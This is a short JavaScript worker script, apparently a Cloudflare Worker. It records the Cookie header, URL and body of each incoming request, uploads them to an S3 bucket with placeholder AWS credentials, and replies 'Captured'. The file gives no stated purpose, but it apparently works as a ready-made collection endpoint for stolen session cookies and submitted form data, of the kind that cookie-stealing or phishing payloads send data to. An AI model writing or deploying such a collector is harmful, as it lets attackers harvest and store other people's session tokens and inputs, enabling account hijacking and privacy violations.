import { AwsClient } from 'aws4fetch';

const aws = new AwsClient({
  accessKeyId: 'YOUR_AWS_KEY',
  secretAccessKey: 'YOUR_AWS_SECRET',
  service: 's3',
  region: 'us-east-1', // or your bucket region
});

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const body = await request.text();
  const session = request.headers.get('Cookie') || 'no-session';
  const logData = `Session: ${session}\nURL: ${request.url}\nBody:\n${body}`;

  const now = new Date().toISOString();
  const key = `logs/${now}.txt`;

  const response = await aws.fetch(`https://YOUR_BUCKET.s3.amazonaws.com/${key}`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'text/plain',
    },
    body: logData,
  });

  return new Response('Captured', { status: response.status });
}
